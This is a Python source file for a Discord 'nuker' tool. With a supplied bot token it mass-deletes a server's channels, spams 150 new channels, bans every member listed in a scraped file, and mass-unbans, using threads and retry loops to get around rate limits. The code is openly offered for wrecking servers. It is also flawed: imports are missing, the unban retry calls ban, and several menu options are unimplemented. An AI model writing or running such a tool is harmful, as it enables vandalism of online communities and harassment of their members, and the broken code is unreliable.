import requests;import threading; 
from urllib3.exceptions import ReadTimeoutError,ProtocolError




class Nuker:
    def __init__(self):
        self.apiversions = [i for i in range(6,11)]
        self.logo = """
        
██   ██     ███    ██ ██    ██ ██   ██ ███████ ██████  
 ██ ██      ████   ██ ██    ██ ██  ██  ██      ██   ██ 
  ███       ██ ██  ██ ██    ██ █████   █████   ██████  
 ██ ██      ██  ██ ██ ██    ██ ██  ██  ██      ██   ██ 
██   ██     ██   ████  ██████  ██   ██ ███████ ██   ██ 
                                                       
                                                       
"""
        self.username = None
        self.guildid = None
        self.disc = None
        self.token : str
        self.menuprint = """
[1] - Delete all channels
[2] - Create channels
[3] - Ban 
[4] - Delete all roles
[5] - Create roles
[6] - Lgbt roles
[7] - Kick all
[8] - Unban all
        """


    def createchann(self,guildid):
        r = requests.post(f"https://discord.com/api/v{random.choice(self.apiversions)}/guilds/{guildid}/channels",headers={"authorization":"Bot %s" % (self.token)}, json={"type":0,"name":"d","permission_overwrites":[]})
        if str(r.status_code).startswith("2"):
            print(Colorate.Color(Colors.green,"[+] Created %s" % (r.json()['id'])))
            return True
        else:
            if 'retry_after' in r.text:
                print(Colorate.Color(Colors.orange,"[!] Ratelimited for %s" % (r.json()['retry_after'])))
                time.sleep(r.json()['retry_after'])
                self.createchann(guildid)
            else:
                print(Colorate.Color(Colors.red,"[!] Error %s" % (r.text)))

    def delchann(self,channid):
        r = requests.delete(f"https://discord.com/api/v{random.choice(self.apiversions)}/channels/{channid}",headers={"authorization":"Bot %s" % (self.token)})
        if str(r.status_code).startswith("2"):
            print(Colorate.Color(Colors.green,"[+] Deleted %s" % (channid)))
            return True
        else:
            if 'retry_after' in r.text:
                print(Colorate.Color(Colors.orange,"[!] Ratelimited for %s" % (r.json()['retry_after'])))
                time.sleep(r.json()['retry_after'])
                self.delchann(channid)
            else:
                print(Colorate.Color(Colors.red,"[!] Error %s" % (r.text)))

    def ban(self,guildid,memberid):
        headers = {
            "authorization":"Bot %s" % (self.token)
        }
        try:
            
            r = requests.put("https://discord.com/api/v%s/guilds/%s/bans/%s" % (random.choice(self.apiversions), guildid,memberid), headers=headers)
        except (ReadTimeoutError,ProtocolError):
            time.sleep(2.5)
            self.ban(guildid=guildid,memberid=memberid)
        if str(r.status_code).startswith("2"):
            print(Colorate.Color(Colors.green,"[+] Banned %s" % (memberid)))
            return True
        else:
            if 'retry_after' in r.text:
                print(Colorate.Color(Colors.orange,"[!] Ratelimited for %s" % (r.json()['retry_after'])))
                time.sleep(r.json()['retry_after'])
                self.ban(guildid,memberid)
            else:
                print(Colorate.Color(Colors.red,"[!] Error %s" % (r.text)))

    def unban(self,guildid,memberid):
        headers = {
            "authorization":"Bot %s" % (self.token)
        }
        try:
            
            r = requests.delete("https://discord.com/api/v%s/guilds/%s/bans/%s"  % (random.choice(self.apiversions), guildid,memberid), headers=headers)
        except (ReadTimeoutError,ProtocolError):
            time.sleep(2.5)
            self.unban(guildid=guildid,memberid=memberid)
        if str(r.status_code).startswith("2"):
            print(Colorate.Color(Colors.green,"[+] Unbanned %s" % (memberid)))
            return True
        else:
            if 'retry_after' in r.text:
                print(Colorate.Color(Colors.orange,"[!] Ratelimited for %s" % (r.json()['retry_after'])))
                time.sleep(r.json()['retry_after'])
                self.ban(guildid,memberid)
            else:
                print(Colorate.Color(Colors.red,"[!] Error %s" % (r.text)))
    def menu(self):
        os.system("CLS")
        Write.Print(Center.XCenter(self.logo), Colors.red_to_white,interval=0)
        Write.Print(Center.XCenter("\n%s#%s" % (self.username,self.disc)),Colors.red_to_white,interval=0)
        Write.Print(Center.XCenter(self.menuprint),Colors.red_to_white,interval=0)
        choice = Write.Input(Center.XCenter("\n[?] Choice >>> "), Colors.red_to_white,interval=0.00001)
        try: choice = int(choice)
        except ValueError: 
            Write.Print(Center.XCenter("\n[!] Invalid choice"), Colors.red_to_white,interval=0)
            time.sleep(5.5)
            self.menu()        
        finally: pass
        match choice:
            case 1:
                guildid = Write.Input(Center.XCenter("\n[?] Server id you want to nuke >>> "), Colors.red_to_white,interval=0.00001)
                if len(str(guildid)) < 19:
                    Write.Print(Center.XCenter("\n[!] Invalid server id"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu()   
                else:pass
                r = requests.get("https://discord.com/api/v%s/guilds/%s" % (random.choice(self.apiversions), guildid),headers={"Authorization":"Bot %s" % (self.token)})
                if r.status_code == 200:
                    pass
                else:
                    Write.Print(Center.XCenter("\n[!] Invalid guild"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu() 
                r = requests.get("https://discord.com/api/v%s/guilds/%s/channels" % (random.choice(self.apiversions), guildid), headers={"Authorization":"Bot %s" % (self.token)})
                for channel in r.json():
                    threading.Thread(target=self.delchann, args=(channel['id'],)).start()

            case 2:
                guildid = Write.Input(Center.XCenter("\n[?] Server id you want to nuke >>> "), Colors.red_to_white,interval=0.00001)
                if len(str(guildid)) < 19:
                    Write.Print(Center.XCenter("\n[!] Invalid server id"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu()   
                else:pass
                r = requests.get("https://discord.com/api/v%s/guilds/%s" % (random.choice(self.apiversions), guildid),headers={"Authorization":"Bot %s" % (self.token)})
                    
                if r.status_code == 200:
                    pass
                else:
                    Write.Print(Center.XCenter("\n[!] Invalid guild"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu() 
                        
                for thrd in range(150):
                    threading.Thread(target=self.createchann, args=(guildid,)).start()
                    #threading.Thread(target=asyncio.gather, args=(self.createchann(guildid))).start()

            case 3:
                guildid = Write.Input(Center.XCenter("\n[?] Server id you want to nuke >>> "), Colors.red_to_white,interval=0.00001)
                if len(str(guildid)) < 19:
                    Write.Print(Center.XCenter("\n[!] Invalid server id"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu()   
                else:pass
                r = requests.get("https://discord.com/api/v%s/guilds/%s" % (random.choice(self.apiversions), guildid),headers={"Authorization":"Bot %s" % (self.token)})
                    
                if r.status_code == 200:
                    pass
                else:
                    Write.Print(Center.XCenter("\n[!] Invalid guild"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu() 
                  
                
                if os.path.exists("./scraped/members.txt"):
                    pass
                else:
                    Write.Print("\n[!] You need to scrape members with scraper.py")
                    time.sleep(5.5)
                    return self.menu()
                with open("./scraped/members.txt", "r+") as members:
                    for member in members.readlines():
                        threading.Thread(target=self.ban, args=(guildid,member.strip())).start()
            case 8:
                guildid = Write.Input(Center.XCenter("\n[?] Server id you want to nuke >>> "), Colors.red_to_white,interval=0.00001)
                if len(str(guildid)) < 19:
                    Write.Print(Center.XCenter("\n[!] Invalid server id"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu()   
                else:pass
                r = requests.get("https://discord.com/api/v%s/guilds/%s" % (random.choice(self.apiversions), guildid),headers={"Authorization":"Bot %s" % (self.token)})
                    
                if r.status_code == 200:
                    pass
                else:
                    Write.Print(Center.XCenter("\n[!] Invalid guild"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu() 
                r = requests.get("https://discord.com/api/v%s/guilds/%s/bans" % (random.choice(self.apiversions), guildid), headers={"authorization":"Bot %s" % (self.token)})
                if str(r.status_code).startswith("2"):
                    pass
                else:
                    Write.Print(Center.XCenter("\n[!] Error : %s" % (r.text)), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu()  
                bans = r.json()
                if len(bans) <= 2:
                    Write.Print(Center.XCenter("\n[!] 0 bans in guild"), Colors.red_to_white,interval=0)
                    time.sleep(5.5)
                    self.menu()
                else:
                    pass
                for ban in bans:
                    threading.Thread(target=self.unban, args=(guildid,ban["user"]["id"])).start()
                

                

    
    def main(self):
        
        os.system("cls")
        Write.Print(Center.XCenter(self.logo), Colors.red_to_white,interval=0)
        token = Write.Input(Center.XCenter("\nBot Token >>> "), Colors.red_to_white,interval=0.00001)
        self.token = token
        print(self.token)
        r = requests.get("https://discord.com/api/v%s/users/@me" % (random.choice(self.apiversions)), headers={"Authorization":"Bot %s" % (self.token)})
        if int(r.status_code) == 200:
            r = r.json()
            self.username = r['username']
            self.disc = r['discriminator']
            Write.Print(Center.XCenter("\nLogged as %s#%s" % (self.username,self.disc)),Colors.red_to_white,interval=0)
            self.menu()
        else:
            Write.Print(Center.XCenter("\n[!] ERROR - %s" % (r.text)), Colors.red_to_white,interval=0.00001)
            time.sleep(5.5)
            self.main()

if __name__ == "__main__":
    Nuker().main()